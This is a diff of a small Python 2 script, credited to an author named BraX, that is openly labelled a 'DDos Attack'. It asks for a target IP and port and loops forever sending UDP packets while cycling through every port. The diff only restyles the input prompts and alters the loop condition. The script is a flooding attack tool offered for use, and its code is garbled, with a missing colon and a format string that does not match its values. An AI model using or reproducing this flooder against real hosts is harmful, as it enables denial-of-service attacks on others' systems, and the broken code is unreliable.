@@ -21,17 +21,16 @@ print "Author   : BraX"
 print "Facebook : https://m.facebook.com/J.cknew"
 print "Verion Demo"
 
-ip = raw_input("IP : ")
-port = input("Port : ") 
+ip = raw_input("<<===..===>> : ")
+port = input("<<===..===>> : ") 
 	
 os.system("clear")
 os.system("figlet DDos Attack")
 sent = 0
 while True:
-     size = rand x rand x rand 
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      print "succeed %s ! packet %s port:%s"%(sent,port)
-     if port == (rand 65535) + 1 :
+     if port == (65535)
        port = 1
